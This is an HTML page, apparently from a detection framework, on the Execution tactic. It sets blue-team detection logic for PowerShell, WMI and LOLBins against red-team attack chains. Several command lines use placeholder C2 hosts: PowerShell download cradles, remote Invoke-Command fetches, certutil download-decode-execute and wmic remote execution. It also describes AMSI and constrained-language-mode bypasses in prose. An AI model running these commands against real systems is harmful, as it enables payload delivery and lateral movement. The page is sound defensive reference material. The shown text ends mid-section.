@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MTDF — Execution | TA0002</title>
+<link rel="stylesheet" href="mtdf.css">
+</head>
+<body>
+
+<header class="site-header">
+  <div class="header-inner">
+    <div>
+      <div class="header-title">
+        <span class="t-white">MTDF · </span>
+        <span class="t-blue">EXECUTION</span>
+        <span class="t-dim"> · TA0002</span>
+      </div>
+      <div class="header-sub">THE MOMENT CODE RUNS ON A HOST · INTENT-FIRST AND SUBSTRATE-FIRST DETECTION · ALL EXECUTION SUBSTRATES</div>
+    </div>
+    <div class="header-badges">
+      <span class="badge badge-gold">TA0002</span>
+      <span class="badge badge-blue">8 ECOSYSTEMS</span>
+      <span class="badge badge-red">24+ COUSIN RULES</span>
+    </div>
+  </div>
+</header>
+
+<nav class="site-nav">
+  <div class="site-nav-inner">
+    <a href="index.html" class="nav-link">Home</a>
+    <a href="execution.html" class="nav-link active">Execution</a>
+    <a href="persistence.html" class="nav-link">Persistence</a>
+    <a href="privilege-escalation.html" class="nav-link">Privilege Escalation</a>
+    <a href="defense-evasion.html" class="nav-link">Defense Evasion</a>
+    <a href="credential-access.html" class="nav-link">Credential Access</a>
+    <a href="discovery.html" class="nav-link">Discovery</a>
+    <a href="lateral-movement.html" class="nav-link">Lateral Movement</a>
+    <a href="collection.html" class="nav-link">Collection</a>
+    <a href="c2.html" class="nav-link">C2</a>
+    <a href="exfiltration.html" class="nav-link">Exfiltration</a>
+    <a href="impact.html" class="nav-link">Impact</a>
+    <a href="novel-research.html" class="nav-link active-gold">★ Novel Research</a>
+  </div>
+</nav>
+
+<div class="main">
+
+<div class="intro-box intro-box-blue">
+  ⚡ EXECUTION ECOSYSTEM — The moment adversary code runs on a host. The most telemetry-rich tactic in the kill chain. Minimum truth doctrine: <strong>something must execute</strong>. Every ecosystem surfaces a structurally distinct execution primitive — intent-first where the command implies capability, substrate-first where no command line is visible. The cousin doctrine maps all execution substrates sharing the same adversary intent, ensuring a pivot from one LOLBin to another does not escape detection coverage.
+</div>
+
+<div class="stats-row">
+  <div class="stat-card"><div class="stat-number t-blue">8</div><div class="stat-label">Core Ecosystems</div></div>
+  <div class="stat-card"><div class="stat-number t-red">24+</div><div class="stat-label">Cousin Rules</div></div>
+  <div class="stat-card"><div class="stat-number t-gold">T1059</div><div class="stat-label">Primary TTP Family</div></div>
+  <div class="stat-card"><div class="stat-number t-green">HIGH</div><div class="stat-label">Detection Yield</div></div>
+  <div class="stat-card"><div class="stat-number t-purple">INTENT</div><div class="stat-label">Anchor Type</div></div>
+</div>
+
+<!-- COUSIN DOCTRINE CLUSTER -->
+<div style="background:var(--bg-card);border:1px solid var(--purple-border);border-radius:4px;padding:20px 24px;margin-bottom:32px;">
+  <div class="doctrine-label">⬡ EXECUTION COUSIN ECOSYSTEM CLUSTER — SHARED INTENT: EXECUTE ARBITRARY CODE VIA TRUSTED/NATIVE MECHANISM</div>
+  <div class="cluster-grid" style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:12px;">
+    <div class="cn-node">PowerShell T1059.001</div><div class="cn-arrow">⟷</div>
+    <div class="cn-node">Cmd T1059.003</div><div class="cn-arrow">⟷</div>
+    <div class="cn-node">WMI T1047</div><div class="cn-arrow">⟷</div>
+    <div class="cn-node">Certutil T1218</div><div class="cn-arrow">⟷</div>
+    <div class="cn-node">Mshta T1218.005</div><div class="cn-arrow">⟷</div>
+    <div class="cn-node">Regsvr32 T1218.010</div><div class="cn-arrow">⟷</div>
+    <div class="cn-node">Rundll32 T1218.011</div><div class="cn-arrow">⟷</div>
+    <div class="cn-node">MSBuild T1127.001</div><div class="cn-arrow">⟷</div>
+    <div class="cn-node">Sched Tasks T1053.005</div>
+  </div>
+  <div style="font-family:var(--font-body);font-size:13px;color:var(--text-dim);font-style:italic;">Block PowerShell → attacker uses cmd.exe. Block cmd.exe → uses WMI. Block mshta → uses regsvr32. The cousin doctrine ensures all execution substrates share a common detection anchor based on the shared intent: executing arbitrary code via a Microsoft-trusted mechanism.</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════ -->
+<!-- ECOSYSTEM 1: PowerShell -->
+<!-- ═══════════════════════════════════════════════ -->
+<div class="ecosystem open" id="eco-ps">
+  <div class="eco-header" onclick="toggleEco('eco-ps')">
+    <div class="eco-id">T1059.001</div>
+    <div>
+      <div class="eco-title">PowerShell Execution Engine</div>
+      <div class="eco-sub">EXECUTION · COMMAND AND SCRIPTING INTERPRETER · INTENT-FIRST</div>
+    </div>
+    <div class="eco-toggle">▼</div>
+  </div>
+  <div class="eco-body">
+    <div class="core-composite">
+      <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+      <div class="core-rule-name">PowerShell Intent-First Composite — Encoded/Obfuscated Execution Anchor</div>
+      <div class="links-row">
+        <a href="#" class="link-rule" onclick="return insertLink(this,'KQL Rule — Sentinel/MDE')">📎 INSERT RULE LINK · KQL · Sentinel + MDE</a>
+        <a href="https://attack.mitre.org/techniques/T1059/001/" class="link-ext" target="_blank">🔗 MITRE T1059.001</a>
+        <a href="#" class="link-rd" onclick="return insertLink(this,'R&D Publication')">📄 INSERT R&D PUBLICATION LINK</a>
+      </div>
+      <div class="two-col">
+        <div class="panel-blue">
+          <div class="panel-label lbl-blue">🔵 BLUE TEAM — Why this composite exists</div>
+          <div class="panel-text">
+            PowerShell is the attacker's native tongue on Windows. The minimum truth anchor is <strong>intent-first</strong>: encoded or obfuscated parameters are structurally anomalous regardless of payload content. A legitimate administrator does not base64-encode routine management scripts.<br><br>
+            The composite anchors on <code>-EncodedCommand</code>, <code>-enc</code>, <code>-e</code> flags combined with parent process context anomaly (Office apps, browsers, WMI, scheduled tasks spawning PowerShell).<br><br>
+            <strong>Reinforcement signals:</strong> network connections immediately post-execution, AMSI bypass strings in Script Block Logs, download cradles (<code>IEX</code>, <code>Invoke-Expression</code>, <code>Net.WebClient</code>), execution from non-standard paths. Cumulative scoring prevents single-signal noise while ensuring the full chain is caught.
+          </div>
+        </div>
+        <div class="panel-red">
+          <div class="panel-label lbl-red">🔴 RED TEAM — How attackers deploy this</div>
+          <div class="panel-text">
+            PowerShell is the attacker's entry point of choice because it is signed, trusted, provides direct .NET access, and is present on every modern Windows system. Kill chain position: <strong>Initial Access → Execution</strong> via phishing macro, or <strong>Post-Exploitation Execution</strong> following lateral movement.<br><br>
+            <strong>Real-world attack chain:</strong><br>
+            Phishing email → malicious Office macro → <code>powershell.exe -w hidden -enc [base64]</code> → download cradle pulls stageless <a href="https://www.cobaltstrike.com/" class="link-ext" target="_blank">Cobalt Strike</a> beacon from C2 → in-memory reflective injection via <code>VirtualAlloc</code> + <code>WriteProcessMemory</code>. No file ever touches disk.<br><br>
+            <strong>Why encoding:</strong> (1) bypasses naive string-matching AV, (2) obscures C2 URLs from proxy log inspection, (3) evades email gateway content scanning.
+            <div class="tags-row">
+              <a href="https://www.cobaltstrike.com/" class="tag tag-red" target="_blank">Cobalt Strike</a>
+              <a href="https://github.com/BC-SECURITY/Empire" class="tag tag-red" target="_blank">Empire</a>
+              <a href="https://github.com/PowerShellMafia/PowerSploit" class="tag tag-red" target="_blank">PowerSploit</a>
+              <a href="https://github.com/samratashok/nishang" class="tag tag-red" target="_blank">Nishang</a>
+              <a href="https://attack.mitre.org/groups/G0016/" class="tag tag-gold" target="_blank">APT29</a>
+              <a href="https://attack.mitre.org/groups/G0046/" class="tag tag-gold" target="_blank">FIN7</a>
+              <a href="https://attack.mitre.org/groups/G0032/" class="tag tag-gold" target="_blank">Lazarus</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="cousin-section">
+      <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES — Click each to expand full red team breakdown</div>
+      <div class="cousin-grid">
+
+        <!-- COUSIN: Download Cradle -->
+        <div class="cousin-card" id="cc-ps-dl">
+          <div class="cousin-header" onclick="toggleCousin('cc-ps-dl')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">PowerShell Download Cradle</div>
+              <div class="cousin-ttp-badge">T1059.001 · T1105</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+              <a href="https://attack.mitre.org/techniques/T1105/" class="link-ext" target="_blank">🔗 T1105 Ingress Tool Transfer</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Execution → C2 → Ingress Tool Transfer</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM — Detection rationale</div>
+              <div class="attack-text">Cousin to the encoding anchor. Targets <code>IEX (New-Object Net.WebClient).DownloadString</code>, <code>Invoke-WebRequest</code>, and <code>Start-BitsTransfer</code> cradles. Minimum truth: a PowerShell process initiating outbound HTTP/HTTPS to a non-corporate domain within seconds of spawn. <strong>Reinforcement:</strong> spawned from anomalous parent (Office, WMI), destination domain age &lt;30 days, JA3 hash anomaly, no HTTP Referer header.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM — When, why and how</div>
+              <div class="attack-text">
+                <strong>When deployed:</strong> Stage 2 of execution chain — attacker has initial code running but needs their full toolkit delivered in-memory.<br><br>
+                <strong>Full chain:</strong> Macro executes <code>powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://[C2]/s.ps1')"</code> → script pulls Cobalt Strike shellcode → shellcode injected into <code>notepad.exe</code> via <code>VirtualAllocEx/WriteProcessMemory/CreateRemoteThread</code> → beacon HTTPS C2 appears as normal browser traffic.<br><br>
+                <strong>Why this technique:</strong> <code>Net.WebClient</code> is a Microsoft-signed class. No additional tools needed. The entire delivery chain uses nothing but native .NET.
+                <div class="tags-row">
+                  <a href="https://www.cobaltstrike.com/" class="tag tag-red" target="_blank">Cobalt Strike Beacon</a>
+                  <a href="https://www.metasploit.com/" class="tag tag-red" target="_blank">Metasploit Meterpreter</a>
+                  <a href="https://github.com/PowerShellMafia/PowerSploit" class="tag tag-red" target="_blank">PowerSploit</a>
+                  <a href="https://attack.mitre.org/groups/G0032/" class="tag tag-gold" target="_blank">Lazarus Group</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- COUSIN: AMSI Bypass -->
+        <div class="cousin-card" id="cc-ps-amsi">
+          <div class="cousin-header" onclick="toggleCousin('cc-ps-amsi')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">AMSI Bypass Detection</div>
+              <div class="cousin-ttp-badge">T1562.001 · T1059.001</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+              <a href="https://attack.mitre.org/techniques/T1562/001/" class="link-ext" target="_blank">🔗 T1562.001 Impair Defenses</a>
+              <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal" class="link-ext" target="_blank">🔗 AMSI Documentation</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Defense Evasion (prerequisite) → Execution</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM</div>
+              <div class="attack-text">AMSI passes script content to AV engines before execution. Bypassing it is a prerequisite for all sophisticated in-memory PowerShell attacks. <strong>Minimum truth:</strong> Script Block Logging capturing known bypass strings (<code>AmsiUtils</code>, <code>amsiInitFailed</code>, <code>AmsiScanBuffer</code>), PowerShell process writing to <code>amsi.dll</code> memory via reflection, or using <code>System.Reflection.Assembly</code> to patch the AMSI provider. This cousin catches the prerequisite — upstream of the actual malicious payload.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM</div>
+              <div class="attack-text">
+                <strong>Why bypass AMSI first:</strong> Without bypassing AMSI, Empire, Cobalt Strike PS payloads, and PowerSploit are immediately caught by Windows Defender even in-memory.<br><br>
+                <strong>Standard reflection patch (3 lines):</strong> Uses .NET reflection to locate <code>AmsiScanBuffer</code> in <code>amsi.dll</code> memory and patches it to return <code>AMSI_RESULT_CLEAN</code> always. Executes in milliseconds before the actual payload. Tools like <a href="https://github.com/RythmStick/AMSITrigger" class="link-ext" target="_blank">AMSITrigger</a> help identify which strings trigger detection so they can be mutated.<br><br>
+                <strong>Kill chain position:</strong> Always before payload — the unlocking step that enables all subsequent in-memory PowerShell execution.
+                <div class="tags-row">
+                  <span class="tag tag-red">Empire AMSI Bypass</span>
+                  <a href="https://github.com/danielbohannon/Invoke-Obfuscation" class="tag tag-red" target="_blank">Invoke-Obfuscation</a>
+                  <a href="https://github.com/RythmStick/AMSITrigger" class="tag tag-red" target="_blank">AMSITrigger</a>
+                  <a href="https://attack.mitre.org/groups/G0046/" class="tag tag-gold" target="_blank">FIN7</a>
+                  <a href="https://attack.mitre.org/groups/G0096/" class="tag tag-gold" target="_blank">APT41</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- COUSIN: Constrained Language Mode Bypass -->
+        <div class="cousin-card" id="cc-ps-clm">
+          <div class="cousin-header" onclick="toggleCousin('cc-ps-clm')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">Constrained Language Mode Bypass</div>
+              <div class="cousin-ttp-badge">T1059.001 · T1562</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+              <a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/" class="link-ext" target="_blank">🔗 CLM Documentation</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Defense Evasion → Execution (restricted environment)</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM</div>
+              <div class="attack-text">Constrained Language Mode blocks .NET type access, COM objects, and most offensive primitives. Monitor for: <code>__PSLockdownPolicy</code> environment variable manipulation, <code>powershell_ise.exe</code> spawning, WDAC policy tampering, and invocation of auto-elevating processes that spawn PowerShell in FullLanguage mode. The bypass attempt itself is the signal — legitimate administrators do not need to circumvent CLM.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM</div>
+              <div class="attack-text">
+                <strong>The problem:</strong> Enterprise CLM enforcement via AppLocker/WDAC blocks most offensive PowerShell toolkits entirely.<br><br>
+                <strong>Bypass path:</strong> Find a COM object or trusted binary that invokes PowerShell in FullLanguage mode. <code>MSBuild.exe</code> and <code>InstallUtil.exe</code> execute inline C# that calls PowerShell APIs directly — sidestepping CLM entirely because the restriction applies to the PS engine, not .NET CLR. Alternatively, exploit <code>__PSLockdownPolicy</code> environment variable which is per-process configurable.
+                <div class="tags-row">
+                  <span class="tag tag-red">MSBuild CLM bypass</span>
+                  <span class="tag tag-red">InstallUtil bypass</span>
+                  <a href="https://github.com/Cn33liz/PowerSharpPack" class="tag tag-red" target="_blank">PowerSharpPack</a>
+                  <span class="tag tag-red">regsvcs.exe bypass</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- COUSIN: PowerShell Remoting -->
+        <div class="cousin-card" id="cc-ps-remote">
+          <div class="cousin-header" onclick="toggleCousin('cc-ps-remote')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">PowerShell Remoting Abuse</div>
+              <div class="cousin-ttp-badge">T1021.006 · T1059.001</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+              <a href="https://attack.mitre.org/techniques/T1021/006/" class="link-ext" target="_blank">🔗 T1021.006 WinRM</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Lateral Movement → Execution (remote)</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM</div>
+              <div class="attack-text">PowerShell Remoting over WinRM (port 5985/5986) is increasingly used for lateral movement. <strong>Minimum truth:</strong> <code>wsmprovhost.exe</code> (WinRM provider host) spawning PowerShell or cmd.exe on a destination host, correlated with a type 3 network logon from an unexpected source. Cousin to WinRM lateral movement — the execution substrate is PS remoting, same intent as PsExec or WMI remote execution.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM</div>
+              <div class="attack-text">
+                <strong>Why PS Remoting over PsExec:</strong> No service installation (no event 7045), uses legitimate Windows Remote Management infrastructure, encrypted by default (HTTPS), appears as standard management traffic. Blocked on SMB port 445 → pivot to WinRM port 5985.<br><br>
+                <strong>Attack command:</strong> <code>Invoke-Command -ComputerName TARGET -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://C2/payload.ps1')}</code> — executes entirely in memory on the remote host.
+                <div class="tags-row">
+                  <a href="https://github.com/S3cur3Th1sSh1t/WinPwn" class="tag tag-red" target="_blank">WinPwn</a>
+                  <span class="tag tag-red">Cobalt Strike WinRM jump</span>
+                  <a href="https://attack.mitre.org/groups/G0016/" class="tag tag-gold" target="_blank">APT29</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════ -->
+<!-- ECOSYSTEM 2: WMI -->
+<!-- ═══════════════════════════════════════════════ -->
+<div class="ecosystem" id="eco-wmi">
+  <div class="eco-header" onclick="toggleEco('eco-wmi')">
+    <div class="eco-id">T1047</div>
+    <div>
+      <div class="eco-title">WMI Fileless Execution Engine</div>
+      <div class="eco-sub">EXECUTION · SUBSTRATE-FIRST DETECTION · NO COMMAND LINE VISIBLE</div>
+    </div>
+    <div class="eco-toggle">▼</div>
+  </div>
+  <div class="eco-body">
+    <div class="core-composite">
+      <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+      <div class="core-rule-name">WMI Provider Host Anomalous Child Process — Substrate-First Anchor</div>
+      <div class="links-row">
+        <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK · KQL · Sentinel + MDE</a>
+        <a href="https://attack.mitre.org/techniques/T1047/" class="link-ext" target="_blank">🔗 MITRE T1047</a>
+      </div>
+      <div class="two-col">
+        <div class="panel-blue">
+          <div class="panel-label lbl-blue">🔵 BLUE TEAM — Why substrate-first is essential here</div>
+          <div class="panel-text">
+            WMI is the quintessential substrate-first detection challenge. No command line is visible — <code>WmiPrvSE.exe</code> spawns child processes that appear to have no parent relationship to the attacker's tool. The <strong>minimum truth anchor</strong>: WmiPrvSE.exe spawning any interactive process: <code>cmd.exe</code>, <code>powershell.exe</code>, <code>cscript.exe</code>, or any executable outside system32.<br><br>
+            The <strong>30-day Atomic Sentinel Layer</strong> is critical here — WMI subscription creation (FilterToConsumerBinding) may occur days before execution fires. The primitive index tracks the subscription event independently, defeating temporal deception. Reinforcement: network connections from WmiPrvSE, process injection into WmiPrvSE, WMI namespace modification events.
+          </div>
+        </div>
+        <div class="panel-red">
+          <div class="panel-label lbl-red">🔴 RED TEAM — Why WMI is a favourite</div>
+          <div class="panel-text">
+            WMI is the attacker's <strong>fileless persistence and execution holy grail</strong>: signed Windows component, runs as SYSTEM, and historically generated almost no detectable telemetry in poorly configured SIEMs.<br><br>
+            <strong>APT-grade attack chain:</strong><br>
+            1. Foothold established via phishing<br>
+            2. Create WMI Event Filter (trigger: system uptime &gt; 5 min)<br>
+            3. Create WMI Event Consumer (action: execute PS download cradle)<br>
+            4. Create FilterToConsumerBinding<br>
+            5. On every reboot, 5 min post-startup, payload executes — no scheduled task, no run key, no file on disk.<br><br>
+            <strong>Why it evades:</strong> WmiPrvSE parent process. Many SIEMs whitelist WmiPrvSE. The payload lives in the WMI repository — a binary database at <code>C:\Windows\System32\wbem\Repository</code>.
+            <div class="tags-row">
+              <span class="tag tag-red">POSHSPY backdoor</span>
+              <span class="tag tag-red">Empire WMI persistence</span>
+              <span class="tag tag-red">Cobalt Strike WMI exec</span>
+              <a href="https://attack.mitre.org/groups/G0016/" class="tag tag-gold" target="_blank">APT29 (Cozy Bear)</a>
+              <a href="https://attack.mitre.org/groups/G0010/" class="tag tag-gold" target="_blank">Turla</a>
+              <a href="https://attack.mitre.org/groups/G0125/" class="tag tag-gold" target="_blank">HAFNIUM</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="cousin-section">
+      <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES</div>
+      <div class="cousin-grid">
+
+        <div class="cousin-card" id="cc-wmi-sub">
+          <div class="cousin-header" onclick="toggleCousin('cc-wmi-sub')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">WMI Event Subscription Persistence</div>
+              <div class="cousin-ttp-badge">T1546.003</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+              <a href="https://attack.mitre.org/techniques/T1546/003/" class="link-ext" target="_blank">🔗 T1546.003</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Persistence → Execution (delayed, reboot-triggered)</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM</div>
+              <div class="attack-text">Monitor WMI namespace writes: <code>__EventFilter</code>, <code>__EventConsumer</code>, <code>__FilterToConsumerBinding</code> creation in <code>root\subscription</code>. These three events together constitute a complete WMI persistence mechanism. Alert on any <code>CommandLineEventConsumer</code> or <code>ActiveScriptEventConsumer</code> creation outside of known IT management tools. Cross-correlate across the 30-day primitive index — binding creation may be separated from execution by hours or days in a patient APT intrusion.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM</div>
+              <div class="attack-text">
+                <strong>During post-exploitation:</strong> Immediately after gaining persistent foothold, before lateral movement begins. The WMI repository survives reboots, AV scans, and some EDR wipes because it lives in a binary database few analysts inspect.<br><br>
+                <strong>Single-command execution (admin rights):</strong> Tools like <a href="https://github.com/mattifestation/WMIBackdoor" class="link-ext" target="_blank">PowerLurk</a> or Empire's <code>persistence/elevated/wmi</code> module create the full subscription chain in seconds.
+                <div class="tags-row">
+                  <span class="tag tag-red">Empire WMI persist</span>
+                  <a href="https://github.com/mattifestation/WMIBackdoor" class="tag tag-red" target="_blank">PowerLurk</a>
+                  <a href="https://attack.mitre.org/groups/G0016/" class="tag tag-gold" target="_blank">APT29</a>
+                  <span class="tag tag-gold">Winnti Group</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="cousin-card" id="cc-wmi-lat">
+          <div class="cousin-header" onclick="toggleCousin('cc-wmi-lat')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">WMI Remote Lateral Execution</div>
+              <div class="cousin-ttp-badge">T1047 · T1021</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+              <a href="https://attack.mitre.org/techniques/T1047/" class="link-ext" target="_blank">🔗 T1047</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Lateral Movement → Execution (remote, no service install)</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM</div>
+              <div class="attack-text">Remote WMI generates: network authentication events (4624 type 3) on destination + WmiPrvSE.exe spawning child process on destination. The composite <strong>joins remote auth events with WmiPrvSE child process creation</strong> on destination host within a 60-second window. Key signal: <code>wmic.exe /node:[target] process call create</code> from a workstation (not a management server) is nearly always malicious.</div>
+            </div>
+            <div class="attack-section">
+              <div class="attack-title at-red">🔴 RED TEAM</div>
+              <div class="attack-text">
+                <strong>Preferred over PsExec because:</strong> No service installation (no event 7045), no file drop to ADMIN$, no PsExec service. Significantly quieter.<br><br>
+                <strong>Command:</strong> <code>wmic /node:192.168.1.50 /user:DOMAIN\admin /password:pass process call create "powershell -enc [payload]"</code><br><br>
+                Tool equivalent: <a href="https://github.com/fortra/impacket" class="link-ext" target="_blank">Impacket's wmiexec.py</a> — pass-the-hash compatible.
+                <div class="tags-row">
+                  <a href="https://github.com/fortra/impacket" class="tag tag-red" target="_blank">Impacket wmiexec</a>
+                  <span class="tag tag-red">CrackMapExec WMI</span>
+                  <span class="tag tag-red">Cobalt Strike jump wmi</span>
+                  <a href="https://attack.mitre.org/groups/G0034/" class="tag tag-gold" target="_blank">Sandworm</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════ -->
+<!-- ECOSYSTEM 3: LOLBins -->
+<!-- ═══════════════════════════════════════════════ -->
+<div class="ecosystem" id="eco-lol">
+  <div class="eco-header" onclick="toggleEco('eco-lol')">
+    <div class="eco-id">T1218</div>
+    <div>
+      <div class="eco-title">LOLBin Execution — Trusted Binary Abuse Ecosystem</div>
+      <div class="eco-sub">EXECUTION · DEFENSE EVASION · INTENT-FIRST · APPLOCKER BYPASS</div>
+    </div>
+    <div class="eco-toggle">▼</div>
+  </div>
+  <div class="eco-body">
+    <div class="doctrine-cluster">
+      <div class="doctrine-label">⬡ LOLBIN COUSIN CLUSTER — SHARED INTENT: EXECUTE CODE VIA MICROSOFT-SIGNED BINARY</div>
+      <div class="cluster-grid">
+        <div class="cn-node">Certutil T1218</div><div class="cn-arrow">⟷</div>
+        <div class="cn-node">Mshta T1218.005</div><div class="cn-arrow">⟷</div>
+        <div class="cn-node">Regsvr32 T1218.010</div><div class="cn-arrow">⟷</div>
+        <div class="cn-node">Rundll32 T1218.011</div><div class="cn-arrow">⟷</div>
+        <div class="cn-node">MSBuild T1127.001</div><div class="cn-arrow">⟷</div>
+        <div class="cn-node">InstallUtil T1218.004</div><div class="cn-arrow">⟷</div>
+        <div class="cn-node">Odbcconf T1218.008</div>
+      </div>
+      <div style="font-family:var(--font-body);font-size:13px;color:var(--text-dim);font-style:italic;margin-top:8px;">Block one LOLBin and the attacker pivots to the next. All carry Microsoft digital signatures. The cousin doctrine catches the intent pattern — anomalous behaviour from a signed binary — regardless of which specific binary is used.</div>
+    </div>
+    <div class="core-composite">
+      <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+      <div class="core-rule-name">Certutil Remote Download / Decode Anchor — LOLBin Intent-First Composite</div>
+      <div class="links-row">
+        <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK · KQL · Sentinel + MDE</a>
+        <a href="https://attack.mitre.org/techniques/T1218/" class="link-ext" target="_blank">🔗 MITRE T1218</a>
+        <a href="https://lolbas-project.github.io/" class="link-ext" target="_blank">🔗 LOLBAS Project</a>
+      </div>
+      <div class="two-col">
+        <div class="panel-blue">
+          <div class="panel-label lbl-blue">🔵 BLUE TEAM</div>
+          <div class="panel-text">
+            Certutil has no legitimate reason to download files from the internet or decode base64 in most enterprise environments. It is the canonical <strong>intent-first detection</strong>: the minimum truth is certutil executing with <code>-urlcache</code>, <code>-decode</code>, or <code>-decodehex</code> flags. The command implies capability regardless of payload.<br><br>
+            <strong>Composite reinforcement:</strong> unusual parent process (Office, browser), output file written to TEMP/AppData/ProgramData, immediate execution of the decoded output file, network egress from certutil itself. The LOLBAS project documents all known LOLBin capabilities — the cousin rules cover each documented abuse path.
+          </div>
+        </div>
+        <div class="panel-red">
+          <div class="panel-label lbl-red">🔴 RED TEAM</div>
+          <div class="panel-text">
+            <strong>Why certutil:</strong> Signed by Microsoft, whitelisted by nearly every application control policy, and capable of base64 decode and remote file download natively — no additional tools.<br><br>
+            <strong>Classic download-decode-execute chain (no PowerShell):</strong><br>
+            <code>certutil -urlcache -split -f http://[C2]/p.txt p.b64</code><br>
+            <code>certutil -decode p.b64 p.exe</code><br>
+            <code>p.exe</code> → Cobalt Strike loader runs<br><br>
+            Entire chain uses only Microsoft-signed binaries. No PowerShell, no scripts, no suspicious extensions.
+            <div class="tags-row">
+              <span class="tag tag-red">Cobalt Strike staging</span>
+              <span class="tag tag-red">Emotet dropper</span>
+              <span class="tag tag-red">BazarLoader</span>
+              <a href="https://attack.mitre.org/groups/G0092/" class="tag tag-gold" target="_blank">TA505</a>
+              <a href="https://attack.mitre.org/groups/G0037/" class="tag tag-gold" target="_blank">FIN6</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="cousin-section">
+      <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES — LOLBin Ecosystem</div>
+      <div class="cousin-grid">
+
+        <div class="cousin-card" id="cc-lol-mshta">
+          <div class="cousin-header" onclick="toggleCousin('cc-lol-mshta')">
+            <div class="cousin-icon">🔴</div>
+            <div>
+              <div class="cousin-name">Mshta Remote HTA Execution</div>
+              <div class="cousin-ttp-badge">T1218.005</div>
+            </div>
+            <span class="cousin-toggle">▼</span>
+          </div>
+          <div class="cousin-body">
+            <div class="links-row">
+              <a href="#" class="link-rule" onclick="return insertLink(this)">📎 INSERT RULE LINK</a>
+              <a href="https://attack.mitre.org/techniques/T1218/005/" class="link-ext" target="_blank">🔗 T1218.005</a>
+              <a href="https://lolbas-project.github.io/lolbas/Binaries/Mshta/" class="link-ext" target="_blank">🔗 LOLBAS: mshta</a>
+            </div>
+            <div class="kc-badge">⚡ KILL CHAIN: Initial Execution (phishing) → no browser sandbox</div>
+            <div class="attack-section">
+              <div class="attack-title at-blue">🔵 BLUE TEAM</div>
